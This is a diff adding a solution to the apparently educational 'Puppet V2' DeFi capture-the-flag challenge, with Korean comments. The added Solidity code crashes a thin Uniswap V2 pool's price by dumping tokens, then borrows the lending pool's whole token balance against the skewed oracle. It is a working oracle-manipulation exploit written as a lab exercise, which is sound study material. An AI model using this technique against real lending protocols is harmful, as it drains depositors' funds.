@@ -98,7 +98,31 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+
+        // 돌파구: 거래소 유동성이 너무 얆다. 주어진 DVT 토큰 일괄 매도로 가격을 폭락시킬 수 있음.
+        // 전 문제 Puppet이랑 별 다를바 없음. 오히려 permit 구성 안해도 돼서 풀이하기는 더 편한듯?
+
+        token.approve(address(uniswapV2Router), type(uint256).max);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(
+            token.balanceOf(player),
+            1,
+            path,
+            player,
+            type(uint256).max
+        );
+
+
+        weth.deposit{ value: player.balance }();
+
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
         
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
